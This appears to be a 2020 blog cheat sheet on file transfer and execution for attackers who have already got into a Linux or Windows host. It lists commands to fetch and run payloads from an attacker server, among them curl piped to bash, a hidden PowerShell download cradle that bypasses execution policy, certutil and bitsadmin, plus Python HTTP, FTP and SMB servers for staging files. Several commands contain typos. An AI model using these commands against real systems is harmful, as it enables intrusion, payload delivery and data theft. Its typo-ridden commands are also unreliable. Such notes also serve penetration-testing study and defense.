---
title: "Data Exfiltration"
description: "In the infiltration process, attackers often need to download and execute code through commands that helps them: Collect information, Extract credentials and data, Create persistence, Privilege Escalation and lateral movement, Bypass defense methods..."
date: 2020-09-03
lastmod: 2020-09-03
author: "Pablo Jesús González Rubio"
cover: "ftp.png"
coverAlt: "Exfiltration via FTP"
toc: true
tags: [ Cheatsheet ]
---

## Introduction

In the infiltration process, attackers often need to download and execute code through commands that help them:

- Collect information
- Extract credentials and data
- Create persistence
- Privilege Escalation and lateral movement
- Bypass defense methods

For that generally is needed to upload/download files to the host and execute them, or on the contrary, execute them directly without downloading it.

Next, I've summarized some methods each for Linux and Windows to carry out the above.

## Linux

### scp

SCP is the acronym for *Secure Copy Protocol* that uses SSH for data transfer.

It's pretty much like `cp` but via SSH and can upload as to download.

A trick to remember how to use it is:

> scp origin destination

Upload:

```
scp myfile.ext user@server.com:~/file.ext
```

Download:

```
scp user@server.com:/root/file.ext myfile.ext
```

In the destination, you can save the file with another name.

### Wget

Wget is a common tool in Linux systems. It allows downloading files from the internet.

Now from the server we can download the file we are hosting:

```
wget <URL>:<PORT>/<FILE -O <OUTFILE>
```

> To download is the same concept but changing who is the server and who's the client.

### Curl

As Wget is a tool that many Linux systems have.

To download a file:

```
curl <URL>:<PORT>/<FILE> -o <OUTFILE>
```

To directly execute a file without downloading it, for example, a bash script:

```
curl -fsSL <URL>:<PORT>/<FILE> | bash
```

### Netcat

Netcat is the most powerful hacking tool as it provides a direct connection between devices.

To download a file we can simulate a GET Request:

```
echo "GET /<FILE> HTTP/1.0" | nc -n <IP> <PORT> > <OUTFILE> && sed -i '1,7' <OUTFILE>
```

Sed is used to remove part of the raw data transmitted that doesn't have to do with the original file.

### FTP

We can upload or download files via FTP. To connect to a server:

```
ftp <IP>
```

To upload `put` command is used and to download is `get`.

If the anonymous user is allowed, then we can enter `anonymous` when it asks for the user.

## Windows

### Powershell

Powershell has a cmdlet that allows downloading a file from *HTTP* pages:

```
IEX ((New-Object Net.WebClient).DownloadFile('<URL>:<PORT>/<FILE','<OUTFILE>'))
```

The above command can be run from within a Powershell terminal and the below one to directly execute it from `GUI + r` or from another Powershell shell:

```
powershell -ep Bypass -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadFile('<URL>:<PORT>/<FILE','<OUTFILE>'))"
```

Don't forget to use single quotes!!

### Invoke-WebRequest

This command is so similar to *wget* that they made an alias for it.

In this way, it doesn't matter to do it like this:

```
wget <URL>:<PORT>/<FILE -OutFile <OUTFILE>
```

Or like this:

```
Invoke-WebRequest <URL>:<PORT>/<FILE -OutFile <OUTFILE>
```

> *-OutFile* is an additional argument.

### Cert-Util

It's a tool originally used for Certificate and Certificate Authority management but it can also be used to download files from *HTTP* pages.

```
certutil -urlcache -splif -f "<URL>:<PORT>/<FILE" <OUTFILE>
```

### Bitsadmin

Also known as *Background Intelligent Transfer Service" is useful to create download or upload jobs and monitor their progress:

```
bitsdmin /transfer n <URL>:<PORT>/<FILE> <OUTFILE>
```

### FTP

We can upload or download files via FTP. To connect to a server:

```
ftp <SERVER>
```

To upload `put` command is used and to download is `get` as in Linux.

If the anonymous user is allowed, then we can connect with:

```
ftp -A <SERVER>
```

Also we can run a list of commands with:

```
ftp -s:MyCommandsFile.txt <SERVER>
```

Let's say I want to autologin and upload a file, then in my file, I would have:

```
<USER>
<PASSWORD>
put <FILE>
```

## File Transfer

### Python HTTP Server

We can create our own HTTP Server to serve files that we can later download within the remote host with:

```
python3 -m http.server
# Or
python -m SimpleHTTPServer
```

> Default port is 8000

To download a file you can use any of the methods above for Linux or Windows meant for HTTP(s) pages.

{{< img "http.png" "HTTP" "border" >}}

### Python FTP Server

We can create an FTP server with `pyftpdlib` python module. To install it:

```
sudo apt install python3-pyftpdlib -y
# Or
sudo apt install python-pyftpdlib -y
```

To create the server:

```
sudo python3 -m pyftpdlib -w -p <PORT>
sudo python -m pyftpdlib -w -p <PORT>
```

- *`-w`* argument allows write permissions in the server
- *`-u`* argument allows to specify a user to log with
- *`-p`* argument allows to set up a password

> If used *`-u`*, anonymous mode will be disabled

{{< img "ftp.png" "FTP" "border" >}}

### Python SMB Server

Python [Impacket]() can be used to create a Samba server which is pretty useful against Windows servers. Python `impacket` module is needed to run `smbserver.py`, to install it:

```
sudo apt install python3-impacket -y
# Or
sudo apt install python-impacket -y
```

Then to run the samba server:

```
python3 <IMPACKET DIRECTORY>/examples/smbserver.py <SHARE> <LOCAL DIRECTORY>
# Or
python <IMPACKET DIRECTORY>/examples/smbserver.py <SHARE> <LOCAL DIRECTORY>
```

For example:

```
python3 ~/python-impacket/examples/smbserver.py PRIVESC ~/Scripts/Privilege
# Or
python ~/python-impacket/examples/smbserver.py PRIVESC ~/Scripts/Privilege
```

{{< img "smb.png" "Samba" "border" >}}